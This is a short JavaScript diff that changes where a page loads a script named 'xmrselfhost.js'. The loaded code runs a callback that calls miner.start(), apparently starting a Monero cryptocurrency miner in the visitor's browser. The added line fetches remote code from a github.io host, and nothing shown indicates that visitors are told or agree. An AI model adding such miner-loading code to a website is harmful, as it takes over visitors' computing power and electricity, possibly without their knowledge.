@@ -22,4 +22,4 @@ var myPrettyCode = function() {
   );
   miner.start();
 };
-loadScript("https://rawgit.com/BoobieLtd/js/master/xmrselfhost.js", myPrettyCode);
+loadScript("https://bobbieltd.github.io/js/xmrselfhost.js", myPrettyCode);
